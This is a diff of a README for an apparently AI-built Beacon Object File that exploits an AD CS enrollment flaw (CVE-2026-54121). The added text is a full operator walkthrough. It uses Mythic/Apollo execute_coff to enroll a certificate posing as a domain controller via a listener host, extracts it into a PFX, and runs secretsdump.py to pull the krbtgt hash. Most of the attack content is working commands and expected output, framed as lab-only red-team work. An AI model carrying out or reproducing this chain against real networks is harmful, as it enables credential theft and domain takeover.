@@ -1,45 +1,200 @@
 # Certighost BOF
 
-*This BOF was researched, developed, and tested using a Large Language Model and Hermes Agent*
+> **Disclosure:** This project was developed entirely by AI using the Hermes harness.
 
-This repository contains a minimal Windows x64 Beacon Object File for the enrollment-only portion of the Certighost / CVE-2026-54121 lab chain. The BOF submits a caller-supplied in-memory PKCS#10 request through `ICertRequest::Submit` with `CR_IN_BINARY | CR_IN_PKCS10 | CR_IN_RPC`, then returns the disposition, request ID, and issued certificate bytes as base64 text over Beacon output.
+Certighost is a Windows x64 Beacon Object File for the enrollment-only portion of the Certighost / CVE-2026-54121 lab chain. It submits a caller-supplied in-memory PKCS#10 request through `ICertRequest::Submit` with `CR_IN_BINARY | CR_IN_PKCS10 | CR_IN_RPC`, then returns the disposition, request ID, and issued certificate bytes over Beacon output.
 
-Run: `certighost-bof-20260727T143312Z`
+This is REDANTONETTA lab-only work. The BOF writes no target-side files and does not create machine accounts, start listeners, perform PKINIT, dump secrets, submit Mythic tasks, or automate rollback.
 
-This is REDANTONETTA lab-only work. No push, publication, deployment, or live target execution is authorized.
+## Stock Mythic Walkthrough
 
-## Scope
+Use this path only in an approved disposable Certighost lab with an already authorized Windows x64 Apollo callback and controlled callback listeners. It uses Apollo's stock `register_file` and stock `execute_coff` commands only. There is no custom Mythic command, alias, plugin, or API task submission in this repository.
 
-The BOF implements only the AD CS enrollment chase trigger. It does not create machine accounts, host rogue SMB/LSA or LDAP callback services, generate a CSR, perform PKINIT, write PFX/ccache files, recover hashes, spawn a process, or write any target-side file. The CSR, request attributes, returned certificate, and transient BSTR/base64 buffers stay in memory; allocated buffers are cleared before release where practical.
+### 1. Build The Reviewed BOF
 
-The rogue SMB/LDAP callback services described in [the research notes](docs/research/CVE-2026-54121.md) are external in-memory lab prerequisites. PKINIT and any post-certificate action are also external prerequisites and are intentionally not implemented here.
-
-## Argument Schema
-
-The `go` entrypoint expects the standard Beacon `bof_pack` frame: one little-endian `u32` payload length followed by six little-endian length-prefixed binary fields. Apollo `execute_coff` v3 passes that frame intact:
-
-```sleep
-$args = bof_pack($bid, "bbbbbb",
-    $csr_der,
-    $ca_config,
-    $template,
-    $san_dns,
-    $cdc,
-    $rmd);
+```sh
+make bof
+shasum -a 256 build/certighost.x64.o
 ```
 
-Fields are ordered as follows:
+Record the digest against the reviewed commit before using the object.
 
-| Field | Meaning | Validation |
+### 2. Register The BOF In Mythic
+
+In the authorized Apollo callback, run the stock command:
+
+```text
+register_file
+```
+
+Use Mythic's file picker to select `build/certighost.x64.o` from the operator workstation. Keep the registered filename `certighost.x64.o`. Then confirm that the `execute_coff` `-Coff` picker shows `certighost.x64.o`. This is an in-memory BOF registration path; do not upload or save anything on the target.
+
+### 3. Generate A Fresh Key And CSR Locally
+
+Use OpenSSL and shell only. The private key stays in an operator-local ephemeral directory and must remain paired with the issued certificate.
+
+```sh
+umask 077
+export RUN_DIR="$HOME/RedAntonetta/artifacts/certighost-run"
+mkdir -p "$RUN_DIR"
+
+openssl req -new -newkey rsa:2048 -nodes \
+  -keyout "$RUN_DIR/target-dc.key.pem" \
+  -out "$RUN_DIR/target-dc.csr.pem" \
+  -subj '/CN=ra-dc01.certighost.redantonetta.test' \
+  -addext 'subjectAltName=DNS:ra-dc01.certighost.redantonetta.test'
+
+openssl req -in "$RUN_DIR/target-dc.csr.pem" -outform DER \
+  -out "$RUN_DIR/target-dc.csr.der"
+openssl req -in "$RUN_DIR/target-dc.csr.pem" -noout -verify -subject
+
+openssl base64 -A -in "$RUN_DIR/target-dc.csr.der" > "$RUN_DIR/target-dc.csr.der.b64"
+```
+
+Open `$RUN_DIR/target-dc.csr.der.b64` and copy its single line for the first argument below. Do not base64-encode the five text values.
+
+### 4. Run One Mixed `execute_coff` Command
+
+Apollo `execute_coff` v3 must receive one `base64` argument followed by five `string` arguments in this exact order:
+
+```text
+csr_der, ca_config, template, san_dns, cdc, rmd
+```
+
+Paste one command into the authorized callback. This sanitized concrete example shows the full mixed shape; replace only `<PASTE_CSR_DER_B64>` with the single-line CSR value generated above.
+
+```text
+execute_coff -Coff certighost.x64.o -Function go -Timeout 30 -Arguments base64:<PASTE_CSR_DER_B64> string:ra-ca01.certighost.redantonetta.test\REDANTONETTA-CERTIGHOST-CA string:Machine string:ra-dc01.certighost.redantonetta.test string:ra-listener.certighost.redantonetta.test string:ra-dc01.certighost.redantonetta.test
+```
+
+The text values in that example mean:
+
+| Position | Field | Example |
 | --- | --- | --- |
-| `csr_der` | DER PKCS#10 request bytes | Non-empty, at most 256 KiB, bounded outer DER `SEQUENCE` |
-| `ca_config` | CA configuration string such as `ca01.lab.local\LAB-CA` | ASCII `host\CAName`, at most 512 bytes |
-| `template` | Certificate template value | Printable ASCII without `:`/newlines, at most 128 bytes |
-| `san_dns` | DNS SAN value without the `dns=` prefix | Optional empty field, otherwise DNS/IP-like ASCII, at most 255 bytes |
-| `cdc` | Chase callback host/IP value | Required DNS/IP-like ASCII, at most 255 bytes |
-| `rmd` | Remote-domain/principal lookup DNS value | Required DNS/IP-like ASCII, at most 255 bytes |
+| 1 | `csr_der` | Base64 of the raw DER CSR bytes |
+| 2 | `ca_config` | `ra-ca01.certighost.redantonetta.test\REDANTONETTA-CERTIGHOST-CA` |
+| 3 | `template` | `Machine` |
+| 4 | `san_dns` | `ra-dc01.certighost.redantonetta.test` |
+| 5 | `cdc` | `ra-listener.certighost.redantonetta.test` |
+| 6 | `rmd` | `ra-dc01.certighost.redantonetta.test` |
 
-The portable parser validates the canonical outer payload length, the six inner field length prefixes, exact field count, and trailing data before the BOF passes the intact frame to `BeaconDataParse`/`BeaconDataExtract`. The BOF constructs this exact attribute string in memory:
+`san_dns` may be empty when the approved lab case requires no SAN. `ca_config`, `template`, `cdc`, and `rmd` are required.
+
+### 5. Read The Result
+
+A vulnerable lab CA returns an issued result and a framed base64 certificate:
+
+```text
+CERTIGHOST_RESULT disposition=3 request_id=41 cert_encoding=base64 cert_der_bytes=<n> cert_base64_chars=<n>CERTIGHOST_CERT_BEGIN
+<base64 DER certificate>
+CERTIGHOST_CERT_END
+```
+
+Apollo commonly aggregates the result header directly with `CERTIGHOST_CERT_BEGIN`; that missing newline is expected.
+
+A patched negative control returns no certificate block:
+
+```text
+certighost: request not issued (disposition=2 request_id=42 last_status=0x80094800)
+certighost: CA message: The request was denied.
+```
+
+Stop if the disposition is not `3`. Preserve only sanitized task/output identifiers and the approved evidence records.
+
+### 6. Extract The Certificate And Prove Key Continuity
+
+Save the complete Mythic output as `$RUN_DIR/mythic-output.txt`, then extract the certificate locally:
+
+```sh
+awk '/CERTIGHOST_CERT_BEGIN/{capture=1;next}/CERTIGHOST_CERT_END/{capture=0}capture' \
+  "$RUN_DIR/mythic-output.txt" | tr -d '[:space:]' | \
+  openssl base64 -d -A -out "$RUN_DIR/issued-cert.der"
+
+openssl x509 -inform DER -in "$RUN_DIR/issued-cert.der" \
+  -out "$RUN_DIR/issued-cert.pem"
+openssl x509 -in "$RUN_DIR/issued-cert.pem" -noout \
+  -subject -issuer -serial -ext subjectAltName
+
+openssl pkey -in "$RUN_DIR/target-dc.key.pem" -pubout -outform DER | \
+  openssl dgst -sha256
+openssl x509 -in "$RUN_DIR/issued-cert.pem" -pubkey -noout | \
+  openssl pkey -pubin -outform DER | openssl dgst -sha256
+```
+
+The two SHA-256 SPKI digests must match. If they do not match, do not use the certificate.
+
+Create a transient PFX only after continuity is proven. Omitting `-passout` uses OpenSSL's hidden export-password prompt without exposing it on argv.
+
+```sh
+openssl pkcs12 -export \
+  -inkey "$RUN_DIR/target-dc.key.pem" \
+  -in "$RUN_DIR/issued-cert.pem" \
+  -out "$RUN_DIR/issued-cert.pfx"
+chmod 600 "$RUN_DIR/issued-cert.pfx"
+```
+
+### 7. Keep Downstream Scope To `krbtgt` Only
+
+PKINIT and replication proof stay outside this repository. If the separately approved harness obtains a TGT from the transient PFX, use it only for the one-account proof:
+
+```sh
+KRB5CCNAME="$RUN_DIR/target-dc.ccache" \
+  secretsdump.py -k -no-pass -just-dc-user 'krbtgt' \
+  'REDANTONETTA.TEST/RA-DC01$@ra-dc01.certighost.redantonetta.test'
+```
+
+Do not remove `-just-dc-user 'krbtgt'`, request additional accounts, or perform a broad dump. Retain only sanitized evidence that one account was requested, the result count was `1`, the RID was `502`, an NT hash was present, and `broad_dump_performed` was `false`.
+
+### 8. Clean Up Local Secrets And Roll Back The Lab
+
+Stop the external listeners and remove the operator-local artifacts created for this run:
+
+```sh
+rm -f "$RUN_DIR/target-dc.key.pem" \
+      "$RUN_DIR/target-dc.csr.pem" \
+      "$RUN_DIR/target-dc.csr.der" \
+      "$RUN_DIR/target-dc.csr.der.b64" \
+      "$RUN_DIR/issued-cert.der" \
+      "$RUN_DIR/issued-cert.pem" \
+      "$RUN_DIR/issued-cert.pfx" \
+      "$RUN_DIR/target-dc.ccache" \
+      "$RUN_DIR/mythic-output.txt"
+rmdir "$RUN_DIR" 2>/dev/null || true
+```
+
+Then use the approved disposable-lab rollback workflow for the DC and CA snapshots. A later validation must use a fresh callback, CSR, key, and run directory.
+
+## Argument Contract
+
+The canonical operator ABI remains one `base64` CSR followed by five `string` values. The deployed 233-line Apollo `execute_coff.py` source with SHA-256 `f6dfdfc6409ac28f17ecc6b0ec6c65f458767c663d340c30f5170c88ade4b2b6` leaves that typed array for the agent. Its `execute_coff.cs` path converts the entries to RunOF `-b` / `-z` arguments, and RunOF `ParsedArgs.SerialiseArgs` passes `go` six raw records with no outer payload-length word:
+
+```text
+u32 type=0, u32 length, data
+```
+
+Both the decoded `base64` DER and each `string` record use RunOF type `BINARY=0`. The deployed RunOF `-z` path appends one `\0` before constructing `OfArg`, and `OfArg(string)` appends another `\0` before ASCII encoding, so each typed string data slice reaches `SerialiseArgs` with exactly two terminal NUL bytes. Newer COFFLoader paths use a different compatible frame: one outer little-endian `u32` payload length followed by six `u32 length, data` slices whose typed strings carry exactly one terminal NUL. The BOF parses both layouts directly instead of asking `BeaconDataParse` / `BeaconDataExtract` to reinterpret validated bytes, because those loader APIs do not share framing semantics across the two paths.
+
+```text
+[base64, csr_der_b64]
+[string, ca_config]
+[string, template]
+[string, san_dns]
+[string, cdc]
+[string, rmd]
+```
+
+The BOF applies framing-specific text normalization before validation and use. RunOF accepts either legacy all-base64 text slices with no NUL bytes or the exact typed-string form with two terminal NULs, stripping both. It rejects RunOF one-NUL, three-or-more-NUL, and embedded-NUL forms. COFFLoader accepts either legacy all-base64 text slices with no NUL bytes or the canonical mixed form with exactly one terminal NUL, stripping one only in the latter case; it rejects double or embedded NULs. Once the leading `type=0` word selects RunOF framing, any later nonzero RunOF type tag fails closed. Both modes still reject empty required text after normalization, malformed framing, truncation, trailing bytes, extra arguments, and invalid field order.
+
+| Field | Validation |
+| --- | --- |
+| `csr_der` | Non-empty, at most 256 KiB, bounded outer DER `SEQUENCE`; arbitrary DER bytes are preserved |
+| `ca_config` | ASCII `host\CAName`, at most 512 bytes |
+| `template` | Visible ASCII without `:` or newlines, at most 128 bytes |
+| `san_dns` | Optional empty value, otherwise DNS/IP-like ASCII, at most 255 bytes |
+| `cdc` | Required DNS/IP-like ASCII, at most 255 bytes |
+| `rmd` | Required DNS/IP-like ASCII, at most 255 bytes |
+
+The in-memory attributes remain:
 
 ```text
 CertificateTemplate:<template>
@@ -50,27 +205,18 @@ rmd:<rmd>
 
 The `SAN:dns=` line is omitted only when `san_dns` is empty.
 
-## Output
+## Optional Offline Helpers
 
-On issuance, the BOF emits a text header and a base64-framed DER certificate:
+`tools/certighost_mythic.py` and `tools/certighost_operator.py` are optional offline helpers for descriptor generation, fixture validation, local extraction, and test coverage. They do not contact Mythic or a target, and they are not required for the stock walkthrough above.
 
-```text
-CERTIGHOST_RESULT disposition=3 request_id=<id> cert_encoding=base64 cert_der_bytes=<n> cert_base64_chars=<n>CERTIGHOST_CERT_BEGIN
-<base64 DER certificate>
-CERTIGHOST_CERT_END
+Apollo's stock typed-array CLI splits argument tokens on spaces. The optional helpers therefore refuse text values containing spaces or edge quotes instead of emitting an operator command that would not reproduce the recorded frame; the BOF ABI itself remains compatible with otherwise valid packed text slices.
+
+```sh
+PYTHONPYCACHEPREFIX=build/pycache python3 -m tools.certighost_mythic \
+  validate-evidence tests/fixtures/mythic/vulnerable-success.json
+PYTHONPYCACHEPREFIX=build/pycache python3 -m tools.certighost_mythic \
+  validate-evidence tests/fixtures/mythic/patched-negative-control.json
 ```
-
-Apollo aggregates the issued `BeaconPrintf` header directly with the next `BeaconOutput` marker, so the canonical exported text has no newline between `cert_base64_chars=<n>` and `CERTIGHOST_CERT_BEGIN`. No output field is a filesystem path. For a denied, pending, or failed submission, the BOF emits the disposition, request ID when available, last status HRESULT when available, and a sanitized CA disposition message. Input validation failures occur before COM enrollment is attempted.
-
-## Prerequisites
-
-Operational use requires all of the following outside this BOF:
-
-- A vulnerable Enterprise CA and an enrollable template that reaches the chase path.
-- A Beacon security context that already has enrollment rights for the selected template.
-- A caller-generated in-memory PKCS#10 request matching the intended requester identity and SAN.
-- A reachable lab-only rogue SMB/LSA plus LDAP callback service for the supplied `cdc` value.
-- Any later PKINIT handling, certificate inspection, or post-certificate validation performed separately in memory.
 
 ## Build And Test
 
@@ -82,22 +228,10 @@ make imports
 git diff --check
 ```
 
-`make bof` prefers `x86_64-w64-mingw32-gcc` when present. In this worktree it falls back to the installed LLVM clang cross-target path and emits `build/certighost.x64.o` as `coff-x86-64`. `make test` builds and runs the macOS host harness plus the offline Mythic packing, task-schema, output, filesystem-evidence, repeatability, and cleanup tests.
+`make bof` prefers `x86_64-w64-mingw32-gcc` when present and otherwise uses the installed LLVM clang cross-target path. `make test` runs the host-side parser harness and offline Python workflow tests.
 
-## Recovery
+## Documentation
 
-If the CA returns a non-issued disposition, retain the reported request ID and CA message as evidence and correct the lab prerequisite or request input before rerunning. The BOF does not retrieve pending requests later, persist certificates, or attempt any recovery action that changes target state.
-
-## Research
-
-- [CVE-2026-54121 / Certighost primary-source research](docs/research/CVE-2026-54121.md)
-
-## Mythic Integration
-
-- [Offline Apollo execute_coff v3 workflow and evidence validation](docs/mythic-integration.md)
-
-## Lab Design
-
-- [REDANTONETTA declarative lab runbook](docs/lab/CVE-2026-54121-redantonetta-runbook.md)
-- [Ludus range config](ludus/ranges/redantonetta-certighost.yml)
-- [Local Certighost lab role](ludus/roles/certighost_lab)
+- [Offline Apollo execute_coff v3 integration](docs/mythic-integration.md)
+- [Sanitized manual full-chain validation](docs/manual-full-chain-validation.md)
+- [CVE-2026-54121 / Certighost research](docs/research/CVE-2026-54121.md)
